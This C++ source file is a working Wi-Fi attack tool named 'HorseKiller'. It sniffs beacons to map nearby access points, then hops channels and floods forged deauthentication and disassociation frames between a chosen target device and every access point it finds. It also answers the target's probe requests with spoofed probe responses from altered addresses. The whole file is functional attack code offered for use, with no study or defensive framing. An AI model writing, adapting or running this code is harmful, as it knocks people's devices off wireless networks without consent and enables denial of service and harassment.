#include <cassert>
#include <chrono>
#include <fstream>
#include <iostream>
#include <map>
#include <memory>
#include <mutex>
#include <string>
#include <thread>
#include <tins/tins.h>
#include <unistd.h>

#include <AccessPointManager.hpp>
#include <Configuration.hpp>

extern "C"
{
#include <80211Wrapper.h>
}

using namespace Tins;
using namespace std;

// include/net/ieee80211_radiotap.h

enum ieee80211_radiotap_tx_flags
{
	IEEE80211_RADIOTAP_F_TX_FAIL = 0x0001,
	IEEE80211_RADIOTAP_F_TX_CTS = 0x0002,
	IEEE80211_RADIOTAP_F_TX_RTS = 0x0004,
	IEEE80211_RADIOTAP_F_TX_NOACK = 0x0008,
	IEEE80211_RADIOTAP_F_TX_NOSEQNO = 0x0010,
	IEEE80211_RADIOTAP_F_TX_ORDER = 0x0020,
};

void injectPacket(PDU *pdu, bool drop_fcs, pcap_t *handle)
{
	auto pkt = pdu->serialize();

	if (pcap_inject(handle, &pkt[0], pkt.size() - (drop_fcs ? 4 : 0)) == -1)
	{
		std::cerr << "Error injecting packet... [ " << pcap_geterr(handle) << " ]" << std::endl;
	}
}

template <typename Packet>
RadioTap constructManagementFrameWithReasonCode(
	HWAddress<6> target_mac,
	HWAddress<6> source_mac,
	HWAddress<6> bssid,
	int channel,
	int reason_code)
{
	Packet mgnt;
	mgnt.reason_code(reason_code);

	mgnt.addr1(target_mac); // set device mac address
	mgnt.addr2(source_mac); // set ap mac address
	mgnt.addr3(bssid);		// set bssid (optional)

	RadioTap radio = RadioTap() / mgnt; // make 802.11 packet

	radio.channel(ieee80211_channel_to_frequency(channel, channel <= 14 ? NL80211_BAND_2GHZ : NL80211_BAND_5GHZ),
				  channel <= 14 ? RadioTap::ChannelType::TWO_GZ : RadioTap::ChannelType::FIVE_GZ);

	radio.tx_flags(IEEE80211_RADIOTAP_F_TX_NOACK);

	return radio;
}

class HorseKiller
{

	bool sniffing;
	bool running;

	int round = 0;
	int now_channel_idx = 0;

	const Configuration &config;
	AccessPointManager apm;

	std::map<int, int> channel_ap_num;

	std::thread sniff_loop, packet_sender_loop;
	PacketSender sender;

	std::map<HWAddress<6>, std::string> bssids;
	std::mutex bssids_lock;

	std::optional<Sniffer> psniffer;

public:
	HorseKiller(const Configuration &config)
		: sniffing(false), running(false), config(config), apm(config)
	{
	}

	void inject_loop()
	{
		for (; running; round++)
		{
			auto channel_aps = apm.getAPs();

			if (round < config.scan_round)
				for (auto channel : config.channels)
					channel_aps[channel].size();

			for (auto &[channel, aps] : channel_aps)
			{
				sniffing = true;

				std::cout << channel << std::endl;
				std::cout.flush();

				setChannel(config.device.c_str(), channel, "");

				auto prev_switch_time = std::chrono::high_resolution_clock::now();

				bool mark = true;

				while (mark)
				{
					auto elapsed_time = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::high_resolution_clock::now() - prev_switch_time);

					if (sniffing && elapsed_time > std::chrono::milliseconds(config.scan_stage_channel_time))
					{
						sniffing = false;
					}
					if (elapsed_time > std::chrono::milliseconds(config.attack_stage_channel_time))
					{
						mark = false;
						break;
					}

					for (auto ap : aps)
					{
						auto elapsed_time = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::high_resolution_clock::now() - prev_switch_time);

						if (sniffing && elapsed_time > std::chrono::milliseconds(config.scan_stage_channel_time))
						{
							sniffing = false;
						}

						if (elapsed_time > std::chrono::milliseconds(config.attack_stage_channel_time))
						{
							mark = false;
							break;
						}

						{
							auto radio = constructManagementFrameWithReasonCode<Dot11Disassoc>(
								config.target_mac,
								ap.bssid,
								ap.bssid,
								channel,
								7 // INVALID_CLASS3_FRAME
							);

							injectPacket(&radio, config.drop_fcs, psniffer->get_pcap_handle());
						}

						{
							auto radio = constructManagementFrameWithReasonCode<Dot11Disassoc>(
								ap.bssid,
								config.target_mac,
								ap.bssid,
								channel,
								7 // INVALID_CLASS3_FRAME
							);

							injectPacket(&radio, config.drop_fcs, psniffer->get_pcap_handle());
						}

						{
							auto radio = constructManagementFrameWithReasonCode<Dot11Deauthentication>(
								config.target_mac,
								ap.bssid,
								ap.bssid,
								channel,
								6 // INVALID_CLASS2_FRAME
							);

							injectPacket(&radio, config.drop_fcs, psniffer->get_pcap_handle());
						}

						{
							auto radio = constructManagementFrameWithReasonCode<Dot11Deauthentication>(
								ap.bssid,
								config.target_mac,
								ap.bssid,
								channel,
								6 // INVALID_CLASS2_FRAME
							);

							injectPacket(&radio, config.drop_fcs, psniffer->get_pcap_handle());
						}

						/*

						for (int i = 0; i < 4; i++)
						{

							auto addr = resp.addr2();
							addr[5] = addr[5] * 61 + 2;
							resp.addr1(config.target_mac);
							resp.addr2(addr);
							resp.addr3(addr);

							resp.ssid(ap.essid);

							RadioTap radio = RadioTap() / resp; // make 802.11 packet
							radio.tx_flags(IEEE80211_RADIOTAP_F_TX_NOACK);

							injectPacket(&radio, config.drop_fcs, psniffer->get_pcap_handle());
						}

						*/

						// std::this_thread::sleep_for(std::chrono::milliseconds(2));
					}
				}
			}
		}
	}

	bool loop_func()
	{

		for (; running;)
		{
			while (sniffing)
			{
				auto pkt = psniffer->next_packet();

				auto &pdu = *pkt.pdu();

				if (Dot11Beacon *beacon = pdu.find_pdu<Dot11Beacon>())
				{
					auto bssid = beacon->addr2();

					auto tap = pdu.find_pdu<RadioTap>();
					auto signal_dbm = (signed)tap->dbm_signal();
					auto channel = ieee80211_frequency_to_channel((signed)tap->channel_freq());
					auto essid = beacon->ssid();
					apm.update(bssid, essid, channel, signal_dbm);
					apm.addBeacon(beacon);
				}

				if (Dot11ProbeRequest *request = pdu.find_pdu<Dot11ProbeRequest>())
				{
					if (request->addr2() == config.target_mac)
					{
						auto tap = pdu.find_pdu<RadioTap>();
						auto channel = ieee80211_frequency_to_channel((signed)tap->channel_freq());

						auto ssid = request->ssid();

						auto ap = apm.getApByESSID(ssid, channel <= 14 ? 2 : 5);

						if (ap.beacon)
						{
							auto &beacon = *(ap.beacon);
							auto addr = beacon.addr2();

							for (int i = 0; i < 4; i++)
							{
								addr[5] = addr[5] * 61 + 19;

								Dot11ProbeResponse response;

								response.addr1(config.target_mac);
								response.addr2(addr);
								response.addr3(response.addr2());

								for (auto option : beacon.options())
								{
									response.add_option(option);
								}

								RadioTap radio = RadioTap() / response;
								radio.tx_flags(IEEE80211_RADIOTAP_F_TX_NOACK);

								injectPacket(&radio, config.drop_fcs, psniffer->get_pcap_handle());
							}
						}
					}
				}

				if (Dot11ProbeResponse *response = pdu.find_pdu<Dot11ProbeResponse>())
				{
					apm.addResponse(response);
				}

				delete pkt.pdu();
			}

			std::this_thread::sleep_for(std::chrono::milliseconds(10));
		}

		return true;
	}

	void start()
	{
		running = true;

		SnifferConfiguration conf;
		conf.set_immediate_mode(true);
		// conf.set_rfmon(true);
		psniffer = Sniffer(config.device, conf);

		packet_sender_loop = std::thread([this]() -> void {
			inject_loop();
		});

		sniff_loop = std::thread([this]() -> void { loop_func(); });
	}

	void join()
	{
		if (sniff_loop.joinable())
			sniff_loop.join();

		if (packet_sender_loop.joinable())
			packet_sender_loop.join();
	}
};

int main(int argc, char *argv[])
{
	if (argc != 2)
	{
		cout << "Usage: " << argv[0] << " <configuration>" << endl;
		return -1;
	}

	std::string yaml_filename = argv[1];

	YAML::Node configYAML = YAML::LoadFile(yaml_filename);

	Configuration config = configYAML.as<Configuration>();

	HorseKiller killer(config);

	killer.start();

	killer.join();
}
